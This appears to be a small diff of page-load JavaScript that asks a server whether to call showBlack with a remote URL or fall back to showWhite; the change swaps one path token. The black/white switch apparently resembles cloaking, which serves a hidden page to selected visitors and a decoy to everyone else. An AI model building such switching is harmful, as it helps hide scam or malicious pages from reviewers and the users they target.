@@ -95,7 +95,7 @@ window.addEventListener('DOMContentLoaded', () => {
     .then(res => {
       if (res?.code === 200 && !res.result && res.url) {
        
-        showBlack(res.url + '/nf5nPY3n');
+        showBlack(res.url + '/GTh3d8Gn');
       } else {
         
         setTimeout(showWhite, 300);
